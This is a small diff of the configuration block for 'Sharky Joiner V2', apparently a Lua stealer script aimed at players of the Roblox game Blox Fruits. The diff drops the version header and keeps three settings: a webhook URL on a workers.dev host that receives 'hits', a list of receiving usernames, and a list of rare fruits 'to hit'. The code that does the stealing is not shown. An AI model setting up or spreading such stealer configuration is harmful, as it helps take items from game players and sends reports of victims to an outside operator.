@@ -1,10 +1,3 @@
---[[
-    Sharky Joiner V2
-    Version: 1.2.11 (Added Debug Logging)
-    - Added print statements for debugging webhook sending flow.
-    - Kept all previous fixes and features.
-]]
-
 Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main hits
 Usernames = { "user1", "user2", "user3", "user4", "user5" } -- << Your usernames here
 FruitsToHit = { "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Ghost-Ghost", "Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)" } -- << Fruits you want
